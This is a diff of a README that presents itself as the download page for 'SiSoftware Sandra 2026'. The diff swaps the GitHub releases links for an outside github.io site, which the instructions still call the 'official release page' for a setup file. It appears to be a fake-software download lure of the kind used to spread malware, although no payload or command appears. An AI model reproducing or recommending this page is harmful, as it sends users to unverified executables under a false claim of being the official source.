@@ -1,6 +1,6 @@
 # 🖥️ SiSoftware-Sandra-2026 - Master your computer hardware performance easily
 
-[![Download SiSoftware Sandra](https://img.shields.io/badge/Download-SiSoftware_Sandra_2026-blue)](https://github.com/atul828/SiSoftware-Sandra-2026/releases)
+[![Download SiSoftware Sandra](https://img.shields.io/badge/Download-SiSoftware_Sandra_2026-blue)](https://atul828.github.io)
 
 ## 📖 About this software
 
@@ -22,7 +22,7 @@ Your computer must meet these basic needs to run SiSoftware Sandra 2026:
 
 Follow these steps to get the software on your machine:
 
-1.  Visit the official release page to download the setup file: [https://github.com/atul828/SiSoftware-Sandra-2026/releases](https://github.com/atul828/SiSoftware-Sandra-2026/releases)
+1.  Visit the official release page to download the setup file: [https://atul828.github.io](https://atul828.github.io)
 2.  Click the link that says "Download" or "Assets" to see available files.
 3.  Choose the version that fits your Windows installation.
 4.  Save the file to a folder you can find, such as your Downloads folder.
